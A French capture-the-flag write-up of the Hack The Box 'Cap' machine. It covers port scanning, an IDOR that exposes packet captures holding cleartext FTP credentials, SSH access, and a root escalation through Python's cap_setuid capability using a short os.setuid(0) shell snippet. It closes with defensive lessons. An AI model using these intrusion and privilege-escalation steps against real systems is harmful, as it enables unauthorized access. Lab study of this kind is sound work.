Cap — Starting Point — Facile

Plateforme : Hack The Box Catégorie : Linux, Enumération web, IDOR, Capacités Linux Date de résolution : 12/10/2026

Contexte

Cap est une machine Linux de difficulté "Facile" du module Starting Point de Hack The Box. Elle héberge un serveur web qui simule un outil d'administration réseau (tableau de bord de captures de paquets). L'énoncé n'indique rien de plus que l'adresse IP de la cible ; l'objectif est d'obtenir un accès utilisateur, puis de passer root.

Reconnaissance

Connexion au VPN/Pwnbox, puis scan de ports avec détection de version :

bash
sudo nmap -sV {target_IP}

Résultat :

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn

Trois ports ouverts : FTP (21), SSH (22) et un serveur HTTP Python (Gunicorn, port 80).

Test rapide de l'accès anonyme sur le FTP :

bash
ftp {target_IP}
# Name: anonymous
# 530 Login incorrect.

L'accès anonyme est désactivé. On se tourne donc vers le site web.

Découverte de la vulnérabilité

Le site web est un tableau de bord "Security Dashboard" avec plusieurs pages : Dashboard, IP Config, Network Status, et Security Snapshot. Les pages "IP Config" et "Network Status" affichent respectivement la sortie brute de commandes système (ifconfig, netstat), ce qui indique que l'application exécute réellement des commandes système côté serveur plutôt que d'afficher des données statiques.

La page "Security Snapshot" déclenche une vraie capture réseau de 5 secondes côté serveur, puis propose de télécharger le fichier .pcap généré via un bouton "Download". En observant l'URL de cette page, on remarque un schéma du type /data/{id}, où {id} s'incrémente à chaque nouvelle capture. Aucun contrôle d'accès ne semble lié à cet identifiant : il s'agit d'une faille IDOR (Insecure Direct Object Reference), permettant d'accéder aux captures d'autres utilisateurs/sessions simplement en modifiant l'ID dans l'URL.

En testant un ID antérieur (/data/0), une capture contenant du trafic plus ancien (72 paquets, contre 0 sur la capture courante) apparaît, disponible au téléchargement.

Exploitation

1. Récupération des identifiants via IDOR

Téléchargement du fichier 0.pcap depuis http://{target_IP}/data/0, puis ouverture dans Wireshark :

bash
wireshark ~/Downloads/0.pcap

En filtrant sur le protocole FTP (ftp dans la barre de filtre), le trafic apparaît en clair (FTP n'est pas chiffré) et révèle une authentification complète :

USER nathan
PASS ********

2. Accès initial via SSH

Les identifiants trouvés dans la capture sont valides également pour la connexion SSH :

bash
ssh nathan@{target_IP}

3. Escalade de privilèges — capacités Linux

Plutôt que de télécharger linPEAS (bloqué par des restrictions réseau sur la Pwnbox ce jour-là), recherche directe des fichiers possédant des capabilities Linux spéciales avec l'outil natif getcap :

bash
getcap -r / 2>/dev/null

Résultat clé :

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

La capacité cap_setuid permet à un processus Python de changer son UID effectif sans passer par le bit SUID classique — un développeur l'a probablement accordée à Python pour permettre au site web de réaliser les captures réseau (qui nécessitent des privilèges), mais cela ouvre une voie d'escalade pour tout utilisateur pouvant exécuter ce binaire.

Exploitation directe depuis l'interpréteur :

bash
/usr/bin/python3.8
python
import os
os.setuid(0)
os.system("/bin/bash")
Résultat

La commande id confirme l'obtention d'un shell root (uid=0(root)). Les flags user.txt et root.txt ont été récupérés et soumis sur la page Hack The Box pour valider la machine "Cap".

Ce que j'ai appris

Ce challenge combine deux vulnérabilités très représentatives d'un audit web + système réel. Côté web, l'IDOR rappelle qu'un identifiant séquentiel et prévisible dans une URL (/data/0, /data/1, ...) doit toujours être accompagné d'un contrôle d'autorisation côté serveur — sans quoi n'importe quel utilisateur authentifié peut accéder aux ressources de n'importe quel autre utilisateur simplement en devinant ou en énumérant des IDs. Côté système, ce challenge illustre que les capabilities Linux, pensées à l'origine pour limiter les privilèges accordés à un binaire (par rapport au tout ou rien du SUID), peuvent elles-mêmes devenir une porte d'entrée vers root si elles sont attribuées trop largement : cap_setuid sur un interpréteur généraliste comme Python équivaut presque à un accès root inconditionnel, puisque n'importe quel script Python devient capable de changer son UID. La bonne pratique est de réserver les capacités sensibles à des binaires dédiés et minimaux, jamais à un interpréteur généraliste.

Outils utilisés
Pwnbox (environnement HTB préconfiguré)
nmap (scan de ports et détection de version)
ftp (test d'accès anonyme)
Navigateur web (exploration du tableau de bord, exploitation de l'IDOR)
Wireshark (analyse de la capture réseau, extraction des identifiants FTP en clair)
ssh (accès initial)
getcap (recherche des capacités Linux pour l'escalade de privilèges)
python3.8 (exploitation de la capacité cap_setuid)